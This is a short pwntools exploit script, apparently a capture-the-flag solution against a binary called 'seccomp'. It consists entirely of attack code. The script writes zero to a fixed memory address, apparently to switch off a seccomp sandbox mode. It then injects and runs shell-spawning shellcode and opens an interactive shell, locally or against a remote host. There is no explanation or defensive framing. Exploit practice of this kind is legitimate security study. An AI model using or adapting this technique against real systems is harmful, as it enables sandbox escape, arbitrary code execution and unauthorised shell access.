from pwn import *

if args.REMOTE:
    io = remote(sys.argv[1],sys.argv[2])
else:
    io = process("./seccomp", )

elf = context.binary = ELF("./seccomp", checksec=False)
rop = ROP(elf)
context.log_level = 'info'


shellcode = shellcraft.sh()

mode_addr = 0x602090

io.recvuntil(b'> ')
io.sendline(b'3')
io.recvuntil(b'addr: ')
io.sendline(str(mode_addr))
io.recvuntil(b'value: ')
io.sendline(b'0')
io.recvuntil(b'> ')
io.sendline(b'1')
io.recvuntil(b'shellcode: ')
io.sendline(asm(shellcode))
io.recvuntil(b'> ')
io.sendline(b'2')
io.interactive()